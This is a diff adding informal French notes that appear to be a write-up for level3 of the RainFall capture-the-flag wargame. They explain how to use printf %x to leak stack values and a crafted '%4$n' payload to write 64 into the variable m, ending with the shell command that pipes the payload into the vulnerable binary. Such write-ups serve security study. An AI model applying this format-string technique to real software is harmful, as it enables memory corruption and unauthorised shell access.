@@ -2,3 +2,66 @@
 
 objectif mettre 64 dans eax
 donc mettre [m] a 64
+address de [m] 0x0804988c
+`python -c 'print("aaaa %x %x %x %x %x")'`
+
+ca donne :
+`aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520`
+
+%x va print en hexa les valeurs pour print les valeurs des address sur la stack
+arg1 printf("aaaa")
+arg2 lens max de var to print
+arg3-4 lib
+arg5 ---> aaaa en hexa
+
+%n ca ecrit nbr caractere ecrit par printf dans l'address pointer 
+`  "*m$" (for some decimal integer m) to specify that the precision is given in the next argument, or in the m-th argument`
+
+
+
+On voit en ouvrant le code qu'il y a 2 fonctions principalement : 
+- la main qui appelle v
+- v
+
+v va principalement faire un sget pour remplir un buffer de 520 caracteres
+mais va limiter le remplissage de celui-ci a 200 caracteres.   
+Donc pas de overflows ici, la taille passer en stdin est limite.   
+Apres ce sgets, l'argument recupere est imprime par un printf.  
+Puis on va comparer [m] avec 64, si [m] est egale a 64 on va pouvoir acceder a un shell.   
+Donc notre objectif est claire, mettre la value 64 dans l'addresse de m.   
+Etape 1 : Defnir l'addresse de m 
+0x0804988c
+
+Etape 2 : Recherche de solution
+Seul chose explotable tend a etre printf de notre arg en stdin
+
+Printf va chercher les arguments passer en parametre puis apres les addresse sur la stack si il y a plus d'argument a print que passer en argument ex speudo code:  
+```
+string = "aaaa %x %x %x %x %x"
+printf(string)
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520
+```
+Dans le context du code donner : 
+arg1 printf("aaaa")
+arg2 lens max de var to print
+arg3-4 lib
+arg5 ---> aaaa en hexa
+
+On arrive a print un argument en hexa donc si on remplace aaaa par l'addresse de m ca donne ca : 
+printf("\x8c\x98\x04\x08" "%x %x %x %x")
+ca donne �200 b7fd1ac0 b7ff37d0 804988c
+
+On arrive a print l\'adresse qu\'on cherche a modifier.
+
+Avec le man printf : on voit que l'on peut associer avec %n le nombre de caractere imprimer a la valeur dans le haut de la pile de la stack,   
+Avec encore plus de recherche on peut voir qu\'on peut choisir la valeur sur la pile qu\' on veux incrementer : 
+`  "*m$" (for some decimal integer m) to specify that the precision is given in the next argument, or in the m-th argument`   
+
+
+Donc la nous somme capable d\'affecter une valeur a l\'adresse de m : 
+printf("\x8c\x98\x04\x08" + "A" * (64 - 4) "%4$n");
+// (64 valeur de comparaison 0x40 -4 l'addresse deja ecrite)
+
+level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")') > /tmp/test
+level3@RainFall:~$ cat /tmp/test - | ./level3 
+
